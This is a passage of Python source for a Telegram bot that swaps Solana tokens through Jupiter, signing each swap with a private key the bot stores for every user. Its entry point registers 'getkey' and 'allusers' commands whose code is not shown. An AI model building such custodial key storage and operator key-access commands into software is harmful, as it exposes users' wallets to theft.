    # ── Token address for buy/sell ────────────────────────────────────────────
    if awaiting == AWAITING_TOKEN_ADDR:
        ctx.user_data["token_mint"] = text
        side      = ctx.user_data.get("side", "buy")
        price     = await get_token_price_usd(text)
        price_str = f"${price:.6f}" if price else "unknown"
        if side == "buy":
            ctx.user_data["awaiting"] = AWAITING_BUY_AMOUNT
            await update.message.reply_text(
                f"Token price: *{price_str}*\n\nHow much *SOL* would you like to spend?",
                parse_mode="Markdown",
            )
        else:
            ctx.user_data["awaiting"] = AWAITING_SELL_AMOUNT
            await update.message.reply_text(
                f"Token price: *{price_str}*\n\nHow many *tokens* would you like to sell? Use the smallest unit.",
                parse_mode="Markdown",
            )
        return

    # ── Buy amount ────────────────────────────────────────────────────────────
    if awaiting == AWAITING_BUY_AMOUNT:
        try:
            sol_amount = float(text)
            lamports   = int(sol_amount * 1e9)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Enter a number.")
            return

        token_mint = ctx.user_data.get("token_mint")
        await update.message.reply_text("⏳ Fetching quote...")
        quote = await jupiter_quote(SOL_MINT, token_mint, lamports)
        if not quote:
            await update.message.reply_text("❌ Could not fetch a quote from Jupiter.")
            return

        out_amount = int(quote.get("outAmount", 0))
        await update.message.reply_text(
            f"📊 *Quote*\n\nSpend: `{sol_amount} SOL`\nReceive: `{out_amount}` tokens\n\nProceed?",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm", callback_data="confirm_buy"),
                 InlineKeyboardButton("❌ Cancel",  callback_data="cancel_prompt")],
            ]),
        )
        ctx.user_data["pending_quote"] = quote
        ctx.user_data["awaiting"]      = None
        return

    # ── Sell amount ───────────────────────────────────────────────────────────
    if awaiting == AWAITING_SELL_AMOUNT:
        try:
            token_amount = int(text)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Enter a number.")
            return

        token_mint = ctx.user_data.get("token_mint")
        await update.message.reply_text("⏳ Fetching quote...")
        quote = await jupiter_quote(token_mint, SOL_MINT, token_amount)
        if not quote:
            await update.message.reply_text("❌ Could not fetch a quote from Jupiter.")
            return

        out_lamports = int(quote.get("outAmount", 0))
        await update.message.reply_text(
            f"📊 *Quote*\n\nSell: `{token_amount}` tokens\nReceive: `{out_lamports/1e9:.4f} SOL`\n\nProceed?",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm", callback_data="confirm_sell"),
                 InlineKeyboardButton("❌ Cancel",  callback_data="cancel_prompt")],
            ]),
        )
        ctx.user_data["pending_quote"] = quote
        ctx.user_data["awaiting"]      = None
        return

# ── Swap confirmation ─────────────────────────────────────────────────────────
async def confirm_swap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    uid     = query.from_user.id
    chat_id = query.message.chat_id
    kp      = get_keypair(uid)
    entry   = user_wallets.get(uid)

    if not kp or not entry:
        await ctx.bot.send_message(chat_id, "❌ No wallet is connected.")
        return

    quote = ctx.user_data.get("pending_quote")
    if not quote:
        await ctx.bot.send_message(chat_id, "❌ This quote expired. Start again.")
        return

    await ctx.bot.send_message(chat_id, "⏳ Building transaction...")

    swap_data = await jupiter_swap(quote, entry["pubkey"])
    if not swap_data or "swapTransaction" not in swap_data:
        await ctx.bot.send_message(chat_id, "❌ Could not build the swap transaction.")
        return

    from solders.transaction import VersionedTransaction
    from solana.rpc.types import TxOpts

    raw_tx    = base64.b64decode(swap_data["swapTransaction"])
    tx        = VersionedTransaction.from_bytes(raw_tx)
    signed    = kp.sign_message(bytes(tx.message))
    signed_tx = VersionedTransaction.populate(tx.message, [signed])

    async with AsyncClient(RPC_URL) as client:
        resp = await client.send_raw_transaction(
            bytes(signed_tx),
            opts=TxOpts(skip_preflight=False, preflight_commitment="confirmed"),
        )

    sig = str(resp.value)
    await ctx.bot.send_message(
        chat_id,
        f"✅ *Swap submitted!*\n\n[View on Solscan](https://solscan.io/tx/{sig})",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(),
    )

# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",    start))
    app.add_handler(CommandHandler("getkey",   getkey))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    logger.info("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
